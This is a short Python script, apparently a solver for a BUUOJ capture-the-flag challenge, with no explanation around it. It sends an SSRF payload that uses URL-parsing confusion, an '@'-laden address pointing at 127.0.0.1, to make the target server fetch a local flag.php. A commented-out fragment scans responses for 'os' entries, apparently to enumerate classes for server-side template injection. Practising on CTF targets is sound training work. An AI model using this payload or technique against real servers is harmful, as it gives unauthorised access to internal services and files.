import requests
url = 'http://f726444a-72a5-4523-b3e7-f94e9ce6ed53.node4.buuoj.cn:81/challenge.php'
payload = '?url=http://linkling:@127.0.0.1:80@linkling.cn/flag.php'

headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
    }

data = {
    
}

html = requests.get(url + payload, headers=headers, data=data)
html.encoding = "utf-8"
print(html.text)



#Module: search for SSTI.OS
#num = 0
#for i in html.text.split(','):
#    if 'os' in i:
#        print(i, num)
#    num += 1